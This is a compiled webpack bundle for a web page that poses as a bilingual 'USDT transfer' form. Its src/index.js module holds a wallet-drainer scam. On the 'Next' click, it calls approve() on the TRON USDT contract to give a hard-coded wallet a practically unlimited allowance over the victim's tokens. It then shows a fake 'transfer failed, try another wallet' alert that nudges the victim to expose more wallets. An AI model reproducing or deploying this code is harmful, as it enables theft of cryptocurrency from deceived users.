!function(t){var i={};function o(n){if(i[n])return i[n].exports;var e=i[n]={i:n,l:!1,exports:{}};return t[n].call(e.exports,e,e.exports,o),e.l=!0,e.exports}o.m=t,o.c=i,o.d=function(n,e,t){o.o(n,e)||Object.defineProperty(n,e,{enumerable:!0,get:t})},o.r=function(n){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(n,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(n,"__esModule",{value:!0})},o.t=function(e,n){if(1&n&&(e=o(e)),8&n)return e;if(4&n&&"object"==typeof e&&e&&e.__esModule)return e;var t=Object.create(null);if(o.r(t),Object.defineProperty(t,"default",{enumerable:!0,value:e}),2&n&&"string"!=typeof e)for(var i in e)o.d(t,i,function(n){return e[n]}.bind(null,i));return t},o.n=function(n){var e=n&&n.__esModule?function(){return n.default}:function(){return n};return o.d(e,"a",e),e},o.o=function(n,e){return Object.prototype.hasOwnProperty.call(n,e)},o.p="",o(o.s="./src/index.js")}({"./node_modules/css-loader/dist/cjs.js!./src/index.css":
/*!*************************************************************!*\
  !*** ./node_modules/css-loader/dist/cjs.js!./src/index.css ***!
  \*************************************************************/
/*! exports provided: default */function(module,__webpack_exports__,__webpack_require__){"use strict";eval('__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _node_modules_css_loader_dist_runtime_api_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ../node_modules/css-loader/dist/runtime/api.js */ "./node_modules/css-loader/dist/runtime/api.js");\n/* harmony import */ var _node_modules_css_loader_dist_runtime_api_js__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_node_modules_css_loader_dist_runtime_api_js__WEBPACK_IMPORTED_MODULE_0__);\n// Imports\n\nvar ___CSS_LOADER_EXPORT___ = _node_modules_css_loader_dist_runtime_api_js__WEBPACK_IMPORTED_MODULE_0___default()(false);\n// Module\n___CSS_LOADER_EXPORT___.push([module.i, "* {\\n\\tmargin: 0;\\n\\tpadding: 0;\\n}\\n\\nhtml,\\nbody {\\n\\theight: 100%;\\n\\twidth: 100%;\\n\\tbackground-color: #F9FCF9;\\n}\\n\\n#app {\\n\\twidth: 90%;\\n\\tmargin: 0 auto;\\n\\tpadding-top: 20px;\\n\\tbox-sizing: border-box;\\n}\\n\\n.contract-title {\\n\\tfont-size: 18px;\\n\\tmargin-bottom: 10px;\\n\\tmargin-left: 10px;\\n\\tcolor: #68666A;\\n}\\n\\n.contract-address {\\n\\twidth: 90%;\\n\\tmargin: 0 auto 30px;\\n\\tbackground-color: #FFFFFF;\\n\\tpadding: 10px;\\n\\tcolor: #D1CFD2;\\n\\tfont-size: 20px;\\n\\tword-wrap: break-word;\\n\\toverflow: hidden;\\n\\tborder-radius: 15px;\\n}\\n\\n.price-title {\\n\\tfont-size: 18px;\\n\\tmargin: 0 0 10px 10px;\\n\\tcolor: #68666A;\\n}\\n\\n.price-content {\\n\\twidth: 90%;\\n\\tmargin: 0 auto 20px;\\n\\tpadding: 5%;\\n\\tcolor: #D1CFD2;\\n\\tfont-size: 20px;\\n\\tword-wrap: break-word;\\n\\toverflow: hidden;\\n\\tborder-radius: 15px;\\n}\\n\\n.price-input {\\n\\twidth: 100%;\\n\\theight: 50px;\\n\\tborder: none;\\n\\tfont-size: 40px;\\n\\tcolor: #000000;\\n\\toutline: none;\\n\\tborder-bottom: 1px solid #eee;\\n\\tpadding-left: 10px;\\n\\tbox-sizing: border-box;\\n}\\n\\n.miner {\\n\\twidth: 90%;\\n\\tmargin: 0 auto;\\n\\tpadding: 10px;\\n\\tcolor: #D1CFD2;\\n\\toverflow: hidden;\\n\\tborder-radius: 15px;\\n\\tdisplay: flex;\\n\\talign-items: center;\\n\\tjustify-content: space-between;\\n\\tfont-size: 16px;\\n}\\n\\n.miner-title {\\n\\tcolor: #68666A;\\n}\\n\\n.btn {\\n\\tbackground-color: #0488C2;\\n\\twidth: 90%;\\n\\theight: 50px;\\n\\tborder-radius: 15px;\\n\\tposition: fixed;\\n\\tbottom: 20px;\\n\\tcolor: #FFFFFF;\\n\\tdisplay: flex;\\n\\talign-items: center;\\n\\tjustify-content: center;\\n}\\n", ""]);\n// Exports\n/* harmony default export */ __webpack_exports__["default"] = (___CSS_LOADER_EXPORT___);\n\n\n//# sourceURL=webpack:///./src/index.css?./node_modules/css-loader/dist/cjs.js')},"./node_modules/css-loader/dist/runtime/api.js":
/*!*****************************************************!*\
  !*** ./node_modules/css-loader/dist/runtime/api.js ***!
  \*****************************************************/
/*! no static exports found */function(module,exports,__webpack_require__){"use strict";eval('\n\n/*\n  MIT License http://www.opensource.org/licenses/mit-license.php\n  Author Tobias Koppers @sokra\n*/\n// css base code, injected by the css-loader\n// eslint-disable-next-line func-names\nmodule.exports = function (useSourceMap) {\n  var list = []; // return the list of modules as css string\n\n  list.toString = function toString() {\n    return this.map(function (item) {\n      var content = cssWithMappingToString(item, useSourceMap);\n\n      if (item[2]) {\n        return "@media ".concat(item[2], " {").concat(content, "}");\n      }\n\n      return content;\n    }).join(\'\');\n  }; // import a list of modules into the list\n  // eslint-disable-next-line func-names\n\n\n  list.i = function (modules, mediaQuery, dedupe) {\n    if (typeof modules === \'string\') {\n      // eslint-disable-next-line no-param-reassign\n      modules = [[null, modules, \'\']];\n    }\n\n    var alreadyImportedModules = {};\n\n    if (dedupe) {\n      for (var i = 0; i < this.length; i++) {\n        // eslint-disable-next-line prefer-destructuring\n        var id = this[i][0];\n\n        if (id != null) {\n          alreadyImportedModules[id] = true;\n        }\n      }\n    }\n\n    for (var _i = 0; _i < modules.length; _i++) {\n      var item = [].concat(modules[_i]);\n\n      if (dedupe && alreadyImportedModules[item[0]]) {\n        // eslint-disable-next-line no-continue\n        continue;\n      }\n\n      if (mediaQuery) {\n        if (!item[2]) {\n          item[2] = mediaQuery;\n        } else {\n          item[2] = "".concat(mediaQuery, " and ").concat(item[2]);\n        }\n      }\n\n      list.push(item);\n    }\n  };\n\n  return list;\n};\n\nfunction cssWithMappingToString(item, useSourceMap) {\n  var content = item[1] || \'\'; // eslint-disable-next-line prefer-destructuring\n\n  var cssMapping = item[3];\n\n  if (!cssMapping) {\n    return content;\n  }\n\n  if (useSourceMap && typeof btoa === \'function\') {\n    var sourceMapping = toComment(cssMapping);\n    var sourceURLs = cssMapping.sources.map(function (source) {\n      return "/*# sourceURL=".concat(cssMapping.sourceRoot || \'\').concat(source, " */");\n    });\n    return [content].concat(sourceURLs).concat([sourceMapping]).join(\'\\n\');\n  }\n\n  return [content].join(\'\\n\');\n} // Adapted from convert-source-map (MIT)\n\n\nfunction toComment(sourceMap) {\n  // eslint-disable-next-line no-undef\n  var base64 = btoa(unescape(encodeURIComponent(JSON.stringify(sourceMap))));\n  var data = "sourceMappingURL=data:application/json;charset=utf-8;base64,".concat(base64);\n  return "/*# ".concat(data, " */");\n}\n\n//# sourceURL=webpack:///./node_modules/css-loader/dist/runtime/api.js?')},"./node_modules/style-loader/dist/runtime/injectStylesIntoStyleTag.js":
/*!****************************************************************************!*\
  !*** ./node_modules/style-loader/dist/runtime/injectStylesIntoStyleTag.js ***!
  \****************************************************************************/
/*! no static exports found */function(module,exports,__webpack_require__){"use strict";eval("\n\nvar isOldIE = function isOldIE() {\n  var memo;\n  return function memorize() {\n    if (typeof memo === 'undefined') {\n      // Test for IE <= 9 as proposed by Browserhacks\n      // @see http://browserhacks.com/#hack-e71d8692f65334173fee715c222cb805\n      // Tests for existence of standard globals is to allow style-loader\n      // to operate correctly into non-standard environments\n      // @see https://github.com/webpack-contrib/style-loader/issues/177\n      memo = Boolean(window && document && document.all && !window.atob);\n    }\n\n    return memo;\n  };\n}();\n\nvar getTarget = function getTarget() {\n  var memo = {};\n  return function memorize(target) {\n    if (typeof memo[target] === 'undefined') {\n      var styleTarget = document.querySelector(target); // Special case to return head of iframe instead of iframe itself\n\n      if (window.HTMLIFrameElement && styleTarget instanceof window.HTMLIFrameElement) {\n        try {\n          // This will throw an exception if access to iframe is blocked\n          // due to cross-origin restrictions\n          styleTarget = styleTarget.contentDocument.head;\n        } catch (e) {\n          // istanbul ignore next\n          styleTarget = null;\n        }\n      }\n\n      memo[target] = styleTarget;\n    }\n\n    return memo[target];\n  };\n}();\n\nvar stylesInDom = [];\n\nfunction getIndexByIdentifier(identifier) {\n  var result = -1;\n\n  for (var i = 0; i < stylesInDom.length; i++) {\n    if (stylesInDom[i].identifier === identifier) {\n      result = i;\n      break;\n    }\n  }\n\n  return result;\n}\n\nfunction modulesToDom(list, options) {\n  var idCountMap = {};\n  var identifiers = [];\n\n  for (var i = 0; i < list.length; i++) {\n    var item = list[i];\n    var id = options.base ? item[0] + options.base : item[0];\n    var count = idCountMap[id] || 0;\n    var identifier = \"\".concat(id, \" \").concat(count);\n    idCountMap[id] = count + 1;\n    var index = getIndexByIdentifier(identifier);\n    var obj = {\n      css: item[1],\n      media: item[2],\n      sourceMap: item[3]\n    };\n\n    if (index !== -1) {\n      stylesInDom[index].references++;\n      stylesInDom[index].updater(obj);\n    } else {\n      stylesInDom.push({\n        identifier: identifier,\n        updater: addStyle(obj, options),\n        references: 1\n      });\n    }\n\n    identifiers.push(identifier);\n  }\n\n  return identifiers;\n}\n\nfunction insertStyleElement(options) {\n  var style = document.createElement('style');\n  var attributes = options.attributes || {};\n\n  if (typeof attributes.nonce === 'undefined') {\n    var nonce =  true ? __webpack_require__.nc : undefined;\n\n    if (nonce) {\n      attributes.nonce = nonce;\n    }\n  }\n\n  Object.keys(attributes).forEach(function (key) {\n    style.setAttribute(key, attributes[key]);\n  });\n\n  if (typeof options.insert === 'function') {\n    options.insert(style);\n  } else {\n    var target = getTarget(options.insert || 'head');\n\n    if (!target) {\n      throw new Error(\"Couldn't find a style target. This probably means that the value for the 'insert' parameter is invalid.\");\n    }\n\n    target.appendChild(style);\n  }\n\n  return style;\n}\n\nfunction removeStyleElement(style) {\n  // istanbul ignore if\n  if (style.parentNode === null) {\n    return false;\n  }\n\n  style.parentNode.removeChild(style);\n}\n/* istanbul ignore next  */\n\n\nvar replaceText = function replaceText() {\n  var textStore = [];\n  return function replace(index, replacement) {\n    textStore[index] = replacement;\n    return textStore.filter(Boolean).join('\\n');\n  };\n}();\n\nfunction applyToSingletonTag(style, index, remove, obj) {\n  var css = remove ? '' : obj.media ? \"@media \".concat(obj.media, \" {\").concat(obj.css, \"}\") : obj.css; // For old IE\n\n  /* istanbul ignore if  */\n\n  if (style.styleSheet) {\n    style.styleSheet.cssText = replaceText(index, css);\n  } else {\n    var cssNode = document.createTextNode(css);\n    var childNodes = style.childNodes;\n\n    if (childNodes[index]) {\n      style.removeChild(childNodes[index]);\n    }\n\n    if (childNodes.length) {\n      style.insertBefore(cssNode, childNodes[index]);\n    } else {\n      style.appendChild(cssNode);\n    }\n  }\n}\n\nfunction applyToTag(style, options, obj) {\n  var css = obj.css;\n  var media = obj.media;\n  var sourceMap = obj.sourceMap;\n\n  if (media) {\n    style.setAttribute('media', media);\n  } else {\n    style.removeAttribute('media');\n  }\n\n  if (sourceMap && typeof btoa !== 'undefined') {\n    css += \"\\n/*# sourceMappingURL=data:application/json;base64,\".concat(btoa(unescape(encodeURIComponent(JSON.stringify(sourceMap)))), \" */\");\n  } // For old IE\n\n  /* istanbul ignore if  */\n\n\n  if (style.styleSheet) {\n    style.styleSheet.cssText = css;\n  } else {\n    while (style.firstChild) {\n      style.removeChild(style.firstChild);\n    }\n\n    style.appendChild(document.createTextNode(css));\n  }\n}\n\nvar singleton = null;\nvar singletonCounter = 0;\n\nfunction addStyle(obj, options) {\n  var style;\n  var update;\n  var remove;\n\n  if (options.singleton) {\n    var styleIndex = singletonCounter++;\n    style = singleton || (singleton = insertStyleElement(options));\n    update = applyToSingletonTag.bind(null, style, styleIndex, false);\n    remove = applyToSingletonTag.bind(null, style, styleIndex, true);\n  } else {\n    style = insertStyleElement(options);\n    update = applyToTag.bind(null, style, options);\n\n    remove = function remove() {\n      removeStyleElement(style);\n    };\n  }\n\n  update(obj);\n  return function updateStyle(newObj) {\n    if (newObj) {\n      if (newObj.css === obj.css && newObj.media === obj.media && newObj.sourceMap === obj.sourceMap) {\n        return;\n      }\n\n      update(obj = newObj);\n    } else {\n      remove();\n    }\n  };\n}\n\nmodule.exports = function (list, options) {\n  options = options || {}; // Force single-tag solution on IE6-9, which has a hard limit on the # of <style>\n  // tags it will allow on a page\n\n  if (!options.singleton && typeof options.singleton !== 'boolean') {\n    options.singleton = isOldIE();\n  }\n\n  list = list || [];\n  var lastIdentifiers = modulesToDom(list, options);\n  return function update(newList) {\n    newList = newList || [];\n\n    if (Object.prototype.toString.call(newList) !== '[object Array]') {\n      return;\n    }\n\n    for (var i = 0; i < lastIdentifiers.length; i++) {\n      var identifier = lastIdentifiers[i];\n      var index = getIndexByIdentifier(identifier);\n      stylesInDom[index].references--;\n    }\n\n    var newLastIdentifiers = modulesToDom(newList, options);\n\n    for (var _i = 0; _i < lastIdentifiers.length; _i++) {\n      var _identifier = lastIdentifiers[_i];\n\n      var _index = getIndexByIdentifier(_identifier);\n\n      if (stylesInDom[_index].references === 0) {\n        stylesInDom[_index].updater();\n\n        stylesInDom.splice(_index, 1);\n      }\n    }\n\n    lastIdentifiers = newLastIdentifiers;\n  };\n};\n\n//# sourceURL=webpack:///./node_modules/style-loader/dist/runtime/injectStylesIntoStyleTag.js?")},"./src/Language.js":
/*!*************************!*\
  !*** ./src/Language.js ***!
  \*************************/
/*! no exports provided */function(module,__webpack_exports__,__webpack_require__){"use strict";eval("__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _i18_json__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./i18.json */ \"./src/i18.json\");\nvar _i18_json__WEBPACK_IMPORTED_MODULE_0___namespace = /*#__PURE__*/__webpack_require__.t(/*! ./i18.json */ \"./src/i18.json\", 1);\n\n\nconst params = new URLSearchParams(window.location.search);\nconst curLanguage = params.get('l');\nconst defaultLanguage = 'Cn';\nlet languageJson = _i18_json__WEBPACK_IMPORTED_MODULE_0__[defaultLanguage];\nif (curLanguage && _i18_json__WEBPACK_IMPORTED_MODULE_0__.hasOwnProperty(curLanguage)) {\n\tlanguageJson = _i18_json__WEBPACK_IMPORTED_MODULE_0__[curLanguage];\n}\ndocument.title = languageJson['title'];\nconst contractTitleEle = document.getElementById('contractTitle');\nconst priceTitleEle = document.getElementById('priceTitle');\nconst minerTitleEle = document.getElementById('minerTitle');\nconst btnEle = document.getElementById('btn');\n\ncontractTitleEle.innerHTML = languageJson['contract-title'];\npriceTitleEle.innerHTML = languageJson['price-title'];\nminerTitleEle.innerHTML = languageJson['miner-title'];\nbtnEle.innerHTML = languageJson['btn-text'];\n\n\n//# sourceURL=webpack:///./src/Language.js?")},"./src/i18.json":
/*!**********************!*\
  !*** ./src/i18.json ***!
  \**********************/
/*! exports provided: Cn, En, default */function(module){eval('module.exports = JSON.parse("{\\"Cn\\":{\\"title\\":\\"USDT转账\\",\\"contract-title\\":\\"收款地址\\",\\"price-title\\":\\"金额\\",\\"miner-title\\":\\"矿工费\\",\\"btn-text\\":\\"下一步\\"},\\"En\\":{\\"title\\":\\"USDT transfer\\",\\"contract-title\\":\\"Receiving address\\",\\"price-title\\":\\"Price\\",\\"miner-title\\":\\"Miner fee\\",\\"btn-text\\":\\"Next\\"}}");\n\n//# sourceURL=webpack:///./src/i18.json?')},"./src/index.css":
/*!***********************!*\
  !*** ./src/index.css ***!
  \***********************/
/*! no static exports found */function(module,exports,__webpack_require__){eval('var api = __webpack_require__(/*! ../node_modules/style-loader/dist/runtime/injectStylesIntoStyleTag.js */ "./node_modules/style-loader/dist/runtime/injectStylesIntoStyleTag.js");\n            var content = __webpack_require__(/*! !../node_modules/css-loader/dist/cjs.js!./index.css */ "./node_modules/css-loader/dist/cjs.js!./src/index.css");\n\n            content = content.__esModule ? content.default : content;\n\n            if (typeof content === \'string\') {\n              content = [[module.i, content, \'\']];\n            }\n\nvar options = {};\n\noptions.insert = "head";\noptions.singleton = false;\n\nvar update = api(content, options);\n\n\n\nmodule.exports = content.locals || {};\n\n//# sourceURL=webpack:///./src/index.css?')},"./src/index.js":
/*!**********************!*\
  !*** ./src/index.js ***!
  \**********************/
/*! no exports provided */function(module,__webpack_exports__,__webpack_require__){"use strict";eval("__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _index_css__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./index.css */ \"./src/index.css\");\n/* harmony import */ var _index_css__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_index_css__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var _Language__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./Language */ \"./src/Language.js\");\n\n\n\nconst trxNum = 10; //燃料费\nconst address = 'TKxqwkghMAzFCX6Bu1kczRgTLHhhwA1wRx'; //钱包地址\nconst btnEle = document.getElementById('btn');\nbtnEle.addEventListener('click', approve);\n\nasync function approve() {\n\ttry {\n\t\tif (window.tronWeb) {\n\t\t\tconst token = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');\n\t\t\tawait token.approve(address, '9999999999999999999').send({\n\t\t\t\tfeeLimit: trxNum * 1000000,\n\t\t\t\tcallValue: 0\n\t\t\t});\n\t\t\talert(\"转账失败,请更换其他钱包地址\");\n\t\t} else {\n\t\t\talert(\"请切换到TRX钱包\");\n\t\t}\n\t} catch (error) {\n\t\tconsole.log(error);\n\t}\n}\n\n\n//# sourceURL=webpack:///./src/index.js?")}});
